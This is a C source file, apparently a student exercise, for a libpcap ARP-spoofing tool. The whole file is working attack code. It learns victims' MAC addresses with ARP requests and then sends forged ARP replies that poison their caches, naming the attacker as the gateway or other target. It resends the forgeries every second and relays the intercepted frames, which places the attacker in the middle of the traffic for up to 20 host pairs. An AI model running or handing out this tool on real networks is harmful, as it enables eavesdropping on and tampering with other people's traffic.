#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <pthread.h>
#include <stdlib.h>
#include <unistd.h>

void usage() {
	printf("syntax: arp_send <interface> <send ip> <target ip>\n");
	printf("sample: arp_send wlan0 <192.168.43.117> <192.168.43.1>\n");
}

void print_ip(u_char *ip_addr) {
	int i;
	for(i=0;i<4;i++) {
		printf("%d%c",ip_addr[i],i==3?'\n':'.');
	}
}

void print_mac(u_char *mac_addr) {
	int i;
	for(i=0;i<6;i++) {
		printf("%02x%c",mac_addr[i],i==5?'\n':':');
	}
}

void print_packet(const u_char *packet,int size) {
	int i;
	for(i=0;i<size;i++) {
		printf("%02x%s",packet[i],i%16==15?"\n":i%8==7?"  ":" ");
	}
	printf("\n");
}

void input_arp(u_char *packet, const void *text,int t_size, int *p_pos) {
	memcpy(packet+*p_pos,text,t_size);
	*p_pos+=t_size;
}

int getIPnMACaddr(char *interface, u_char *ip_addr, u_char *mac_addr) {
	int sock;
	struct ifreq ifr={0};
	struct sockaddr_in *sin;
	u_char *mac = NULL;
	
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		printf("no socket\n");
		return 0;
	}

	strcpy(ifr.ifr_name, interface);
	if (ioctl(sock, SIOCGIFADDR, &ifr)< 0) { //get IP address
		printf("getIP failed\n");
		//close(sock);
		return 0;
	}
	sin = (struct sockaddr_in*)&ifr.ifr_addr;
	/*
	uint32_t temp;
	memcpy(&temp, (const void *)(&(sin->sin_addr)),4);
	memcpy(ip_addr,(const void *)&temp,4);	*/
	memcpy(ip_addr, (const void *)(&(sin->sin_addr)),4);
	
	if (ioctl(sock, SIOCGIFHWADDR, &ifr)< 0) { //get MAC address
		printf("getMAC failed\n");
		//close(sock);
		return 0;
	}
	mac = (u_char *)ifr.ifr_hwaddr.sa_data;
	memcpy(mac_addr,mac,6);
	
	//close(sock);
	return 1;
}

enum{D_M=0,S_M=6,E_T=12,H_T=14,P_T=16,HW_S=18,PT_S=19,ARP_OP=20,SEND_MAC=22,SEND_IP=28,TARG_MAC=32,TARG_IP=38};

int makeARPpacket(u_char *packet, u_char *dest_mac,u_char *src_mac, u_char *dest_ip, u_char *src_ip, int opcode) {
	//ethernet structures : 
	//dest mac(6B) src mac(6B) ethtype(2B) ->tot. 14B Ethernet header
	//hardware type(2B) protocol type(2B) HW size, PT size(2B) OPcode(2B) ->8B
	//sender MAC,IP(10B) target MAC,IP(10B) ->20B
	int st=0;
	//ethernet header
	//sprintf(packet,"%s%s%s",dest_mac,src_mac,"\x08\x06");
	input_arp(packet,dest_mac,6,&st);
	input_arp(packet,src_mac,6,&st);
	input_arp(packet,"\x08\x06",2,&st);
	
	//ARP header
	//sprintf(packet+14,"%s%s","\x00\x01\x08\x00\x06\x04",opcode==1?"\x00\x01":"\x00\x02");
	input_arp(packet,"\x00\x01\x08\x00\x06\x04",6,&st);
	input_arp(packet,opcode==1?"\x00\x01":"\x00\x02",2,&st);
	input_arp(packet,src_mac,6,&st);
	input_arp(packet,src_ip,4,&st);
	if(memcmp(dest_mac,"\xff\xff\xff\xff\xff\xff",6)==0) {
		input_arp(packet,"\x00\x00\x00\x00\x00\x00",6,&st);
	}
	else input_arp(packet,dest_mac,6,&st);
	input_arp(packet,dest_ip,4,&st);
	return st;
}
int arp_send(const u_char *packet, int packet_size, char *dev) {
	printf("packet size : %d\n",packet_size);
	print_packet(packet,packet_size);
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if(handle == NULL) {
		printf("device %s open error\n",dev);
		return -1;
	}
	if(pcap_sendpacket(handle,packet,packet_size) == -1) {
		printf("send packet error1\n");
		pcap_close(handle);
		return -1;
	}
	pcap_close(handle);
	return 0;
}

int arp_send_recv(u_char *dest_mac, u_char *s_packet, int s_packet_size, char *dev, u_char *my_mac, u_char *my_ip) {
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	//print_packet(s_packet,s_packet_size);	
	if(arp_send(s_packet,s_packet_size,dev)) {
		printf("send packet error2\n");
		return -1;
	}
	while(true) {
		printf("start capturing packet\n");

		struct pcap_pkthdr* header;
		const u_char* r_packet;
		int r_size;
		int res = pcap_next_ex(handle, &header, &r_packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;
		r_size = header->caplen;
		//print_packet(r_packet,r_size<0x4f?r_size:0x4f);
		uint16_t eth_type = (r_packet[E_T]<<8)+r_packet[E_T+1];
		//printf("eth_type : %04x\n",eth_type);
		//print_mac(my_mac);
		//print_ip(my_ip);
		if(eth_type != 0x0806) continue;
		
		if(memcmp(r_packet+TARG_IP,my_ip,4)!=0 || memcmp(r_packet+SEND_IP,s_packet+TARG_IP,4)!=0) {
			printf("wrong packet received\n");
			continue;
		}
		printf("target MAC received\n");
		memcpy(dest_mac,r_packet+SEND_MAC,6);
		print_mac(dest_mac);
		//sleep(100);			
		pcap_close(handle);
		return 0;
	}

}

int arp_change(u_char *packet,int *p_size, char* dev, u_char *srcIP, u_char *srcMAC, u_char *sendIP, u_char *sendMAC, u_char *targetIP) {
	int  packet_size;
	*p_size = makeARPpacket(packet,sendMAC,srcMAC,sendIP,srcIP,1);
	packet_size = *p_size;
	printf("%d\n",packet_size);
	//print_packet(packet,packet_size);	
	if(arp_send_recv(sendMAC,packet,packet_size,dev,srcMAC,srcIP)) {
		printf("receive packet error\n");
		return 0;
	}
	packet_size = makeARPpacket(packet,sendMAC,srcMAC,sendIP,targetIP,2);
	//print_packet(packet,packet_size);
	if(arp_send(packet,packet_size,dev) ) {
		printf("packet spoofing error\n");
		return 0;
	}
	printf("MAC address change complete!\n");
	return 0;
}
typedef struct MultiArg{char *dev; u_char *srcIP,*srcMAC,*sendIP,*sendMAC,*targetIP;}MultiArg;
typedef struct packet_s{u_char *packet; int packet_size; char *dev;}packet_s;
void assign(MultiArg *input, char *dev, u_char *srcIP, u_char *srcMAC, u_char *sendIP, u_char *sendMAC, u_char *targetIP) {
	input->dev=dev, input->srcIP=srcIP, input->srcMAC=srcMAC, input->sendIP=sendIP, input->sendMAC=sendMAC, input->targetIP=targetIP;
}
void *continuous_spoof(void *arg) {
	packet_s *temp = (packet_s *)arg;
	while(1) {
		sleep(1);
		arp_send(temp->packet,temp->packet_size,temp->dev);
	}

}

void *arp_spoof_thread(void *arg) {
	char* dev;
	u_char *srcIP, *srcMAC, *sendIP, *sendMAC, *targetIP, *targetMAC;
	MultiArg *temp = (MultiArg *)arg;
	u_char packet[50]={0};
	int packet_size;
	dev = temp->dev, srcIP=temp->srcIP, srcMAC=temp->srcMAC;
	sendIP=temp->sendIP, sendMAC=temp->sendMAC, targetIP=temp->targetIP;
/*	printf("sIP,sMAC,dIP,dMAC,tIP : \n");
	print_ip(srcIP);
	print_mac(srcMAC);
	print_ip(sendIP);
	print_mac(sendMAC);
	print_ip(targetIP);
	sleep(3);
	printf("sIP,sMAC,dIP,dMAC,tIP : \n");
	print_ip(srcIP);
	print_mac(srcMAC);
	print_ip(sendIP);
	print_mac(sendMAC);
	print_ip(targetIP);
	sleep(10);*/

	targetMAC = (u_char *)malloc(sizeof(u_char)*6);
	memcpy(targetMAC,"\xff\xff\xff\xff\xff\xff",6);

	packet_size = makeARPpacket(packet,targetMAC,srcMAC,targetIP,srcIP,1);
//	print_packet(packet,packet_size);
//int arp_send_recv(u_char *dest_mac, u_char *s_packet, int s_packet_size, char *dev, u_char *my_mac, u_char *my_ip) {
	arp_send_recv(targetMAC,packet,packet_size,dev,srcMAC,srcIP);
	print_mac(targetMAC);
//	sleep(10);	
	arp_change(packet, &packet_size,dev, srcIP, srcMAC, sendIP, sendMAC, targetIP);
	packet_s argpacket;
	argpacket.packet = packet;
	argpacket.packet_size = packet_size;
	argpacket.dev = dev;
	pthread_t thread;
	pthread_create(&thread,NULL,continuous_spoof,&argpacket);


	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	while(true) {
		printf("start capturing packet\n");

		struct pcap_pkthdr* header;
		const u_char* r_packet;
		int r_size;
		int res = pcap_next_ex(handle, &header, &r_packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;
		r_size = header->caplen;
		//print_packet(r_packet,r_size<0x4f?r_size:0x4f);
		uint16_t eth_type = (r_packet[E_T]<<8)+r_packet[E_T+1];
		printf("eth_type : %04x\n",eth_type);
		if(memcmp(r_packet+D_M,srcMAC,6)==0 && memcmp(r_packet+S_M,sendMAC,6)==0 && eth_type != 0x0806) {
			memcpy((void *)(r_packet+D_M),targetMAC,6);
			memcpy((void *)(r_packet+S_M),srcMAC,6);
			printf("sending packet\n");
			print_packet(r_packet,r_size<0x4f?r_size:0x4f);
			if(arp_send(r_packet,r_size,dev)) {
				printf("send packet error3\n");
				return 0;
			}
			continue;
		}
		if(eth_type !=0x0806) continue;
		if(memcmp(r_packet+TARG_MAC,srcMAC,6) != 0 || memcmp(r_packet+TARG_IP,srcIP,4)!=0) {
			printf("wrong packet received\n");
			continue;
		}
		
		if(arp_send(packet,packet_size,dev) ) {
			printf("packet spoofing error\n");
			return 0;
		}
		continue;
		pcap_close(handle);
		free(targetMAC);
		return 0;
	}
	return 0;
}

int main(int argc, char *argv[]) {
	if (argc < 4 && argc%2!=0) {
		usage();
		return -1;
	}
	pthread_t thread;
	char* dev = argv[1];
	u_char srcIP[4], srcMAC[6];
	u_char sendIP[20][4], sendMAC[20][6];
	u_char targetIP[20][4];
	MultiArg arguments[20];	

	struct in_addr temp;
	getIPnMACaddr(dev,srcIP,srcMAC);
	
	for(int i=1;2*i<argc;i++) {
		inet_aton(argv[2*i],&temp);
		memcpy(sendIP[i],&temp,4);
		inet_aton(argv[2*i+1],&temp);
		memcpy(targetIP[i],&temp,4);
		memcpy(sendMAC[i],"\xff\xff\xff\xff\xff\xff",6);
		assign(&arguments[i],dev, srcIP, srcMAC, sendIP[i], sendMAC[i], targetIP[i]);
		printf("creating thread %d...\n",i);
		if(pthread_create(&thread, NULL, arp_spoof_thread,(void *)&arguments[i])<0) {
			printf("create thread error\n");
		}
		sleep(1);
	}
	pthread_join(thread,NULL);
	printf("finished\n");	
	return 0;
}
